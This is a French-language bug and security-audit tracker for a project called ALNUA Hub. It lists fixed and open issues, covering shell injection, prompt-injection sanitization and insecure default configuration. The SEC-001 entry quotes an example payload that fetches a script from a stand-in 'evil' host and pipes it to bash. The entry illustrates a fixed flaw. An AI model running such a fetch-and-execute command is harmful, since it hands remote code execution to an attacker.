# Bugs — ALNUA Hub

> Créé le 2026-07-25 lors du bootstrap de gouvernance, alimenté par un audit sécurité
> + un audit qualité de code menés en parallèle (voir `DOC_AUDIT.md` pour le détail de
> la méthode). Convention : `SEC-XXX` pour la sécurité, `BUG-XXX` pour le reste.

## Corrigés (2026-07-25)

| ID | Gravité | Description | Correctif |
|----|---------|-------------|-----------|
| SEC-001 | **Critique** | `POST /ide/run` (`services/ide_workspace.py::run_sandbox_command`) — `subprocess.run(cmd, shell=True)` avec allowlist par préfixe (`startswith`) : les métacaractères shell (`;`, `&&`, `\|`, backticks) passaient après un préfixe autorisé (ex. `echo x && curl evil/x\|bash`), et un `pytest-evil` passait le filtre par préfixe | Rejet des commandes contenant `; & \| \` $ < > \n \r`, et comparaison du premier token **exact** (plus de `startswith`) contre l'allowlist. Vérifié : commandes légitimes passent, injection et bypass de préfixe bloqués (test manuel), `ruff` clean |
| SEC-004 | Moyenne | `POST /sav/ask` (`bots/sav_bot.py::handle_question`) — texte libre client inséré dans le prompt LLM sans passer par `sanitize_user_input`, contrairement au pattern systématique de `agents_pole.py` | `question = sanitize_user_input(question, max_length=2000)` avant construction du prompt |
| SEC-005 | Moyenne | `POST /agents/brainstorm` et `/agents/brainstorm/chat` (`api/routers/releases.py`) — `topic`, `context_notes`, `message` transmis à `BrainstormAgent` sans sanitization | Ajout d'un helper `_clean()` (même pattern que `agents_pole.py::_clean`) appliqué aux 3 champs |
| SEC-006 | Moyenne | `services/trend_monitor.py::_llm_synthesize_trends` — titres bruts HackerNews/Reddit/GitHub (contenu externe non fiable, contrôlé par n'importe qui sur ces plateformes) interpolés tels quels dans le prompt de synthèse LLM | `sanitize_user_input(item.title, max_length=300)` (strip_injection actif par défaut) avant assemblage du prompt |
| BUG-001 | Faible | `agents/rnd_agent.py::__init__` et `agents/rnd_social_agent.py::__init__` redéfinissaient `__init__` sans appeler `super().__init__()` — violation de la règle invariante `AgentBase` (voir `CLAUDE.md`). Sans impact fonctionnel aujourd'hui (les deux assignaient manuellement les mêmes attributs que `AgentBase`), mais silencieusement fragile si `AgentBase.__init__` gagne un attribut | `super().__init__(db, llm)` / `super().__init__()` en première ligne, imports `get_supabase`/`LLMClient` devenus inutiles retirés. Suite complète (354 passed, 6 skipped) + `ruff` verts après coup |

Suite de tests complète (`pytest tests/ -q`) et `ruff check agents/ services/ api/ config/ database/ bots/ skills/` **verts après l'ensemble des corrections ci-dessus**.

## Ouverts — nécessitent une décision produit/déploiement, non corrigés

| ID | Gravité | Description | Constat |
|----|---------|-------------|---------|
| SEC-002 | **Haute** | Mode "dev ouvert" par défaut : `HUB_API_KEY` a pour défaut `""` et `ENVIRONMENT` a pour défaut `"development"` (`config/settings.py`). Si un déploiement oublie de positionner les deux, l'API entière (y compris `/mcp`, `/ide/run`, `/agents/embedded/pi-command`) bascule en accès libre — seul un `logger.warning` le signale, pas d'échec au démarrage (`api/middleware.py:69-113`) | Non corrigé volontairement : le README documente explicitement ce comportement comme le confort de dev attendu ("`HUB_API_KEY` est optionnel en développement"). Durcir ce défaut change un comportement documenté et pourrait casser un poste de dev existant sans clé — **décision à prendre avec Emilie**, pas un simple bugfix. Piste : échec dur au démarrage si l'app bind sur autre chose que `127.0.0.1` sans `HUB_API_KEY`, plutôt que warning silencieux |
| SEC-003 | **Haute** | `POST /agents/embedded/pi-command` (`skills/skill_pi_ssh.py`) — commande SSH vers le Raspberry Pi filtrée par **denylist** best-effort seulement (le code le documente lui-même : *"trust boundary, not a sandbox"*). Combiné à SEC-002, si `HUB_API_KEY` n'est pas positionnée, exécution de commandes arbitraires sur du matériel physique | Risque assumé par le code existant *si* la clé est bien configurée — dépend entièrement de la résolution de SEC-002. Pas de fix isolé pertinent ici |
| DEC-009 | — | `skills/skill_nwiro.py` (client MCP Unreal Engine 5) actif et référencé par 3 agents, alors que `CLAUDE.md` liste "Pas d'UE5" comme règle invariante — coexiste avec l'intégration Godot | Voir `DECISIONS.md` DEC-009 — décision produit non tranchée, pas touché |
| BUG-002 | Info | `data/agent_models.json` est tracké par git (commit `16c84c2`) alors qu'il figure dans `.gitignore` — Git n'applique jamais rétroactivement un ignore à un fichier déjà suivi. Contenu vérifié : routage modèle par agent, aucune donnée sensible | Cosmétique — `git rm --cached data/agent_models.json` supprimerait le suivi sans supprimer le fichier local, mais c'est une action destructive sur l'historique de tracking à valider avec Emilie plutôt qu'à faire en autonome |
| BUG-003 | Info | `requirements.lock.txt` : `fastapi-mcp==0.4.0` est pinné exactement dans `requirements.txt` (donc censé être "vérifié installé" selon la convention du fichier) mais absent du lock. À distinguer des 8 paquets **déjà documentés** comme non vérifiés dans le commentaire `requirements.txt:53-57` (`stripe`, `google-play-scraper`, `composio_crewai`, `rq`, `pytest-cov`, les 2 `opentelemetry-instrumentation-*`, `boto3`) — ceux-là sont un gap connu et assumé, pas une nouvelle trouvaille | À vérifier dans l'environnement de déploiement réel avant de figer une version, conformément à la note déjà présente dans `requirements.txt` — ne pas deviner |
| BUG-004 | Info | Fichiers Python dépassant largement les ~300 lignes recommandées : `agents/coo_agent.py` (1475), `api/routers/rnd.py` (1242), `agents/rnd_center.py` (1210), `services/rnd_repository.py` (1056), `skills/skill_coding_agent.py` (1034), `services/workflow_engine.py` (1028), et 9 autres fichiers >700 lignes | Dette structurelle pré-existante, pas un bug fonctionnel. Un découpage de `coo_agent.py`/`rnd.py` est le candidat le plus net si une dette technique est planifiée un jour — pas entrepris ici (refactor de cette taille sur du code qui tourne = décision à part, pas un fix de sécurité/gouvernance) |
| BUG-005 | Info | `agents/coo_agent.py` a `AGENT_NAME = "coo_agent"` en interne (pas `"coo"`), sans alias dans `AGENT_ID_ALIASES` contrairement aux autres agents en `_agent` — déjà documenté comme connu dans `CLAUDE.md` avant ce bootstrap | Reporté ici pour visibilité dans le tracker de bugs plutôt que seulement en note CLAUDE.md — pas corrigé (pas dans le périmètre de cet audit) |

## Vérifié sans anomalie (audit sécurité, pour mémoire)

Secrets en dur, `.env` commité, injection SQL, CORS wildcard+credentials, path
traversal, logs qui fuient des secrets, contrôle d'accès sur `/mcp` et endpoints de
mutation — voir le détail dans `DOC_AUDIT.md`, audit 001.
